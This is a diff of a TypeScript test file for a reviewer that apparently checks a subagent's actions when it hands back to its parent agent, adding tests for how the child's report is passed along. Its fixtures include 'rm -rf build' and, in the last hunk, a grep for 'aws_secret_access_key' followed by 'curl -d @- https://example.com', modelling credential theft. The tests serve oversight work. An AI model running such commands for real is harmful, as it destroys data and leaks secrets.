@@ -110,10 +110,28 @@ describe("hand-back review transcript", () => {
 
 	it("reviews a foreground run against the session through its own spawning call", async () => {
 		await mainBatch();
-		fake.events.emit(SUBAGENT_ACTIONS_CHANNEL, { toolCallId: "agent-1", actions: [{ toolName: "bash", subject: "rm -rf build" }] } satisfies SubagentActionsPayload);
+		fake.events.emit(SUBAGENT_ACTIONS_CHANNEL, { toolCallId: "agent-1", report: "done", actions: [{ toolName: "bash", subject: "rm -rf build" }] } satisfies SubagentActionsPayload);
 		await fake.fireOne("tool_result", { toolCallId: "agent-1", toolName: "Agent", content: [{ type: "text", text: "report" }] }, ctx);
 		expect(lastTranscript()).toContain("rm -rf build");
 		expect(lastTranscript()).not.toContain(SIBLING);
+	});
+
+	it("ends the review with the hand-back carrying the child's report, never as the user's words", async () => {
+		await mainBatch();
+		fake.events.emit(SUBAGENT_ACTIONS_CHANNEL, { toolCallId: "agent-1", actions: [{ toolName: "bash", subject: "rm -rf build" }], report: "Removed build/.\nAll clean." } satisfies SubagentActionsPayload);
+		await fake.fireOne("tool_result", { toolCallId: "agent-1", toolName: "Agent", content: [{ type: "text", text: "report" }] }, ctx);
+		const request = vi.mocked(classify).mock.calls.at(-1)![0] as ClassifyRequest;
+		expect(request.transcript.at(-1)).toEqual({ kind: "hand-back", report: "Removed build/.\nAll clean." });
+		expect(request.userMessages.join("\n")).not.toContain("All clean.");
+	});
+
+	it("still reviews a payload from an emitter that sends no report", async () => {
+		await mainBatch();
+		await new Promise<HandBackVerdict | undefined>((resolve) => {
+			fake.events.emit(SUBAGENT_ACTIONS_CHANNEL, { toolCallId: "task-1", actions: [{ toolName: "bash", subject: "rm -rf build" }], background: true, startedBy: "agent-1", onReview: resolve });
+		});
+		const request = vi.mocked(classify).mock.calls.at(-1)![0] as ClassifyRequest;
+		expect(request.transcript.at(-1)).toEqual({ kind: "hand-back", report: "" });
 	});
 
 	it("reviews a background turn through the call that started it", async () => {
@@ -121,6 +139,7 @@ describe("hand-back review transcript", () => {
 		await new Promise<HandBackVerdict | undefined>((resolve) => {
 			fake.events.emit(SUBAGENT_ACTIONS_CHANNEL, {
 				toolCallId: "task-1",
+				report: "done",
 				actions: [{ toolName: "bash", subject: "rm -rf build" }],
 				background: true,
 				startedBy: "agent-1",
@@ -140,7 +159,7 @@ describe("hand-back review transcript", () => {
 			{ toolName: "grep", subject: "aws_secret_access_key" },
 			{ toolName: "bash", subject: "curl -d @- https://example.com" },
 		];
-		fake.events.emit(SUBAGENT_ACTIONS_CHANNEL, { toolCallId: "spawn-1", actions } satisfies SubagentActionsPayload);
+		fake.events.emit(SUBAGENT_ACTIONS_CHANNEL, { toolCallId: "spawn-1", actions, report: "done" } satisfies SubagentActionsPayload);
 		await fake.fireOne("tool_result", { toolCallId: "spawn-1", toolName: "Agent", content: [{ type: "text", text: "report" }] }, ctx);
 		expect(classify).toHaveBeenCalledTimes(1);
 		const request = vi.mocked(classify).mock.calls[0][0] as ClassifyRequest;
